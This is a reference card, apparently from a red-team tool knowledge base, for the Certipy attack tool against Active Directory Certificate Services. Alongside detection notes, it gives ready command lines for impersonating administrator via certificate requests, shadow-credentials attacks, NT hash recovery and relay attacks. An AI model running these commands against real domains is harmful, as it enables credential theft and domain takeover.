---
name: Certipy
category: adcs
subcategories: [esc1, esc2, esc3, esc4, esc6, esc8, esc9, esc10, esc13, cert-request, shadow-credentials]
tradecraft_tags: [adcs, certificate, esc, pkinit, shadow-credentials, python, linux-side]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://github.com/ly4k/Certipy
  license: MIT
  maintained: true
binary_type: python-script
binary_filename: certipy
supported_os: [linux, windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Same signals as Certify — LDAP queries to PKI configuration container (Certificate
  Templates, CAs), certificate enrollment requests logged in CA database (Event 4886),
  PKINIT authentication generates pre-auth type 16 Kerberos events. Certipy additionally
  implements shadow credentials (msDS-KeyCredentialLink writes → Event 5136). Newer
  ESC attacks (ESC9/10/13) may not yet have dedicated MDI signatures.
usage_examples:
  - description: Find all vulnerable certificate templates (Linux-side)
    args: "certipy find -u jon.snow -p Password123 -dc-ip 192.168.56.10 -vulnerable"
  - description: Request a certificate via ESC1
    args: "certipy req -u jon.snow -p Password123 -dc-ip 192.168.56.10 -ca CORP-CA -template VulnTemplate -upn administrator@corp.local"
  - description: Authenticate with certificate and get NT hash (UnPAC)
    args: "certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 192.168.56.10"
  - description: Shadow credentials attack (add key credential to target)
    args: "certipy shadow auto -u jon.snow -p Password123 -dc-ip 192.168.56.10 -account administrator"
  - description: Relay to ADCS web enrollment (ESC8)
    args: "certipy relay -ca 192.168.56.20 -template DomainController"
  - description: Full find with output for offline analysis
    args: "certipy find -u jon.snow -p Password123 -dc-ip 192.168.56.10 -bloodhound"
opsec_notes: |
  Certipy is the Python equivalent of Certify + Whisker + Rubeus-PKINIT combined.
  It runs from Linux infrastructure and combines ADCS enumeration, certificate
  request, PKINIT authentication, and shadow credentials into one tool. The detection
  surface is the same as the Windows-side tools. Certipy's `find -bloodhound` output
  can be imported into BloodHound CE for ADCS path analysis. ESC9/10/13 may have
  fewer detection signatures than ESC1-8.
gotchas: |
  Python-only — not Apollo-runnable. Certipy typically outputs .pfx and .ccache files.
  The `auth` subcommand combines PKINIT + UnPAC-the-hash into one step (equivalent to
  Rubeus `asktgt /certificate /getcredentials /show`). Certipy's shadow credentials
  (`shadow auto`) handles the full Whisker workflow from Linux — shadow add + PKINIT + hash
  recovery in one command. The `-bloodhound` flag on `find` produces JSON for BloodHound CE import.
related_ttps: [certify, whisker, rubeus, pkinittools, forgecert]
alternatives: [certify, whisker-pkinittools]
common_args:
  find:
    description: Enumerate CAs and certificate templates
    typical_values: [flag-only, "-vulnerable", "-bloodhound"]
    required: false
  req:
    description: Request a certificate
    typical_values: [flag-only]
  auth:
    description: Authenticate with certificate + UnPAC the hash
    typical_values: [flag-only]
  shadow:
    description: Shadow credentials attack (Whisker equivalent)
    typical_values: ["auto", "add", "list", "remove"]
  relay:
    description: ESC8 relay to ADCS web enrollment
    typical_values: [flag-only]
  -u:
    description: Username in user@domain or just user format
    typical_values: ["jon.snow", "administrator@corp.local"]
    required: true
  -p:
    description: Password
    typical_values: ["Password123"]
  -hashes:
    description: NTLM hash for authentication
    typical_values: [":nthash"]
  -dc-ip:
    description: Domain controller IP
    typical_values: ["192.168.56.10"]
    required: true
  -ca:
    description: CA name (for certificate requests)
    typical_values: ["CORP-CA", "SEVENKINGDOMS-CA"]
  -template:
    description: Certificate template name
    typical_values: ["VulnTemplate", "User"]
  -upn:
    description: UPN for ESC1 SAN (equivalent to Certify /altname)
    typical_values: ["administrator@corp.local"]
  -vulnerable:
    description: Filter find output to vulnerable templates only
    typical_values: [flag-only]
  -bloodhound:
    description: Output in BloodHound CE-compatible JSON format
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# Certipy

Oliver Lyak's comprehensive Python ADCS exploitation toolkit. Certipy combines what
Certify, Whisker, PKINITtools, and Rubeus-PKINIT do separately — all from a Linux system.
It covers ESC1-13 detection and exploitation, shadow credentials (Whisker equivalent),
PKINIT authentication, NT hash recovery, and ESC8 relay attacks. The `-bloodhound` output
flag is particularly valuable: Certipy's ADCS findings can be imported into BloodHound CE
to include ADCS attack paths in the graph.

## Typical use cases
- Full ADCS exploitation chain from Linux (find → request → authenticate → hash)
- Shadow credentials from Linux (single command: `shadow auto`)
- ESC8 relay attack against ADCS web enrollment endpoint
- BloodHound CE ADCS data enrichment (`find -bloodhound`)
- ESC9/10/13 exploitation (newer ESC variants beyond Certify's scope)

## How Sage uses this
Certipy is the infrastructure-side complement to Certify+Whisker+Rubeus for Linux-based
operators. In engagements where the C2 infrastructure is Linux-based and Apollo agents
aren't the only tool in the pipeline, Certipy can execute the full ADCS chain without
any Windows tooling. The BloodHound export is particularly useful for operators running
BloodHound CE.

The `shadow auto` command is the most efficient shadow credentials workflow:
1. Adds key credential to target account
2. Authenticates via PKINIT
3. Recovers NT hash (UnPAC)
4. Removes the shadow credential

All in one command.

## Output
- `find`: Markdown or JSON report of CA/template misconfigurations; `-bloodhound` produces BH-importable zip
- `req`: PFX certificate file saved to disk
- `auth`: NT hash (printed), TGT ccache file saved to disk
- `shadow auto`: Complete shadow credential workflow, prints NT hash

## Full Reference

> Captured against Certipy v4.8.x, 2026-05-29. Source: https://github.com/ly4k/Certipy README.

### Sub-commands

| Sub-command | Description |
|-------------|-------------|
| `find` | Enumerate CAs, templates, and check for ESC misconfigurations |
| `req` | Request a certificate from a CA |
| `auth` | Authenticate with a certificate using PKINIT, recover NT hash |
| `shadow` | Shadow credentials operations (add/list/remove/auto) |
| `relay` | ESC8 relay to ADCS web enrollment (ntlmrelayx-style) |
| `account` | Manage AD accounts (create, modify) |
| `forge` | Forge certificates with a CA private key (ForgeCert equivalent) |
| `template` | Manage certificate templates (ESC4 exploitation) |
| `ca` | CA operations |
| `cert` | Certificate file operations (convert, inspect) |

### ESC Coverage (Certipy vs Certify)

| ESC | Certify | Certipy |
|-----|---------|---------|
| ESC1 (Enrollee Supplies Subject) | ✅ | ✅ |
| ESC2 (Any Purpose) | ✅ | ✅ |
| ESC3 (Enrollment Agent) | ✅ | ✅ |
| ESC4 (Template ACL) | ✅ | ✅ |
| ESC5 (Object Control) | ❌ | ✅ |
| ESC6 (EDITF flag) | ✅ | ✅ |
| ESC7 (CA ACL) | ❌ | ✅ |
| ESC8 (Web enrollment relay) | ❌ | ✅ |
| ESC9 (No Security Extension) | ❌ | ✅ |
| ESC10 (Weak Certificate Mapping) | ❌ | ✅ |
| ESC11 (IF_ENFORCEENCRYPTICERTREQUEST) | ❌ | ✅ |
| ESC13 (Issuance Policy) | ❌ | ✅ |

### `shadow auto` workflow

```bash
# Single command: add shadow cred → PKINIT → get NT hash → cleanup
certipy shadow auto -u attacker -p P@ss -dc-ip DC_IP -account targetuser
# Output: NT hash for targetuser without any offline cracking
```

### Source for this reference

- https://github.com/ly4k/Certipy (README and blog posts)
- ly4k blog: https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
- Version: v4.8.x as of 2026-05-29
